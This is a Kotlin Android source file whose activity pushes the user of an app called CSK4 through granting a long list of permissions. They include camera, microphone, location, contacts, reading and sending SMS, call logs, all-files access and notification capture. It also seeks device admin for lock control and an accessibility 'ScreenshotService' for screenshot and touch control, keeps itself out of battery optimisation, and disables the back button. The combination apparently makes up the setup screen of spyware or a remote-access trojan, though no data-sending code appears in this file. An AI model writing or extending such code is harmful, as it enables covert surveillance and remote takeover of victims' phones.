package com.csk4.app

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.os.PowerManager
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class PermissionActivity : AppCompatActivity() {

    private lateinit var tvStatus: TextView
    private lateinit var tvProgress: TextView
    private lateinit var btnNext: Button
    private var currentIndex = 0

    private val prefs by lazy { getSharedPreferences("csk4_perms", Context.MODE_PRIVATE) }

    private val runtimePerms = mutableListOf<Pair<String, String>>(
        Manifest.permission.CAMERA to "📷 Camera",
        Manifest.permission.RECORD_AUDIO to "🎤 Microphone",
        Manifest.permission.ACCESS_FINE_LOCATION to "📍 Fine Location",
        Manifest.permission.ACCESS_COARSE_LOCATION to "📍 Coarse Location",
        Manifest.permission.READ_CONTACTS to "👥 Contacts",
        Manifest.permission.READ_SMS to "💬 SMS",
        Manifest.permission.SEND_SMS to "📩 Send SMS",
        Manifest.permission.READ_CALL_LOG to "📞 Call Logs",
        Manifest.permission.READ_PHONE_STATE to "📱 Phone State",
        Manifest.permission.VIBRATE to "📳 Vibrate"
    )

    init {
        if (Build.VERSION.SDK_INT >= 33) {
            runtimePerms.add(Manifest.permission.POST_NOTIFICATIONS to "🔔 Notifications")
            runtimePerms.add(Manifest.permission.READ_MEDIA_IMAGES to "🖼️ Images")
            runtimePerms.add(Manifest.permission.READ_MEDIA_VIDEO to "🎬 Videos")
            runtimePerms.add(Manifest.permission.READ_MEDIA_AUDIO to "🎵 Audio")
        } else {
            runtimePerms.add(Manifest.permission.READ_EXTERNAL_STORAGE to "📁 Storage")
        }
        if (Build.VERSION.SDK_INT >= 31) {
            runtimePerms.add(Manifest.permission.BLUETOOTH_SCAN to "📶 BT Scan")
            runtimePerms.add(Manifest.permission.BLUETOOTH_CONNECT to "📶 BT Connect")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_permission)

        tvStatus = findViewById(R.id.tvStatus)
        tvProgress = findViewById(R.id.tvProgress)
        btnNext = findViewById(R.id.btnNext)

        btnNext.setOnClickListener { handleNext() }

        currentIndex = 0
        showCurrent()
    }

    override fun onResume() {
        super.onResume()
        if (currentIndex >= runtimePerms.size) {
            checkSpecialPermissions()
        } else {
            showCurrent()
        }
    }

    private fun showCurrent() {
        if (currentIndex >= runtimePerms.size) {
            checkSpecialPermissions()
            return
        }

        val (perm, label) = runtimePerms[currentIndex]
        val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

        if (granted) {
            currentIndex++
            showCurrent()
            return
        }

        tvStatus.text = label
        tvProgress.text = "Permission ${currentIndex + 1} of ${runtimePerms.size}"
        btnNext.text = "Allow Permission"
    }

    private fun handleNext() {
        if (currentIndex >= runtimePerms.size) {
            checkSpecialPermissions()
            return
        }

        val perm = runtimePerms[currentIndex].first
        val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED

        if (granted) {
            currentIndex++
            showCurrent()
        } else {
            ActivityCompat.requestPermissions(this, arrayOf(perm), 100 + currentIndex)
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(this, "✅ Granted", Toast.LENGTH_SHORT).show()
            currentIndex++
            showCurrent()
        } else {
            val denied = permissions[0]
            if (ActivityCompat.shouldShowRequestPermissionRationale(this, denied)) {
                Toast.makeText(this, "❌ Permission zaroori hai. Dobara try karein.", Toast.LENGTH_LONG).show()
            } else {
                Toast.makeText(this, "⚠️ Settings mein jaake permission ON karein", Toast.LENGTH_LONG).show()
                openAppSettings()
            }
        }
    }

    private fun checkSpecialPermissions() {
        // 1. All Files Access
        if (Build.VERSION.SDK_INT >= 30) {
            if (!Environment.isExternalStorageManager()) {
                tvStatus.text = "📁 All Files Access\n\nSab files access karein"
                tvProgress.text = "Special Permission 1 of 5"
                btnNext.text = "Open Settings"
                btnNext.setOnClickListener {
                    try {
                        val i = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        i.data = Uri.parse("package:$packageName")
                        startActivity(i)
                    } catch (e: Exception) {
                        startActivity(Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION))
                    }
                }
                return
            }
        }

        // 2. Notification Access
        if (!isNotificationServiceEnabled()) {
            tvStatus.text = "🔔 Notification Access\n\nNotifications capture karne ke liye"
            tvProgress.text = "Special Permission 2 of 5"
            btnNext.text = "Open Settings"
            btnNext.setOnClickListener {
                try {
                    startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_SETTINGS))
                }
            }
            return
        }

        // 3. Device Admin
        val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, DeviceAdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            tvStatus.text = "🛡️ Device Admin\n\nLock aur security ke liye"
            tvProgress.text = "Special Permission 3 of 5"
            btnNext.text = "Activate Admin"
            btnNext.setOnClickListener {
                val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Enable for lock control")
                startActivity(i)
            }
            return
        }

        // 4. Accessibility
        if (ScreenshotService.instance == null) {
            tvStatus.text = "📸 Accessibility\n\nScreenshot + Touch control ke liye"
            tvProgress.text = "Special Permission 4 of 5"
            btnNext.text = "Open Accessibility"
            btnNext.setOnClickListener {
                startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                Toast.makeText(this, "CSK4 ON karein", Toast.LENGTH_LONG).show()
            }
            return
        }

        // 5. Battery Optimization
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
            tvStatus.text = "🔋 Battery Optimization\n\nBackground service ke liye OFF karein"
            tvProgress.text = "Special Permission 5 of 5"
            btnNext.text = "Disable Optimization"
            btnNext.setOnClickListener {
                try {
                    val i = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                    i.data = Uri.parse("package:$packageName")
                    startActivity(i)
                } catch (e: Exception) {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                }
            }
            return
        }

        // All granted!
        prefs.edit().putBoolean("all_granted", true).apply()
        tvStatus.text = "✅ All Permissions Granted"
        tvProgress.text = "Complete!"
        btnNext.text = "Continue"
        btnNext.setOnClickListener {
            startActivity(Intent(this, LoginActivity::class.java))
            finish()
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun openAppSettings() {
        try {
            val i = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
            i.data = Uri.parse("package:$packageName")
            startActivity(i)
        } catch (e: Exception) {}
    }

    override fun onBackPressed() {
        Toast.makeText(this, "⚠️ Permissions zaroori hain", Toast.LENGTH_SHORT).show()
    }
}
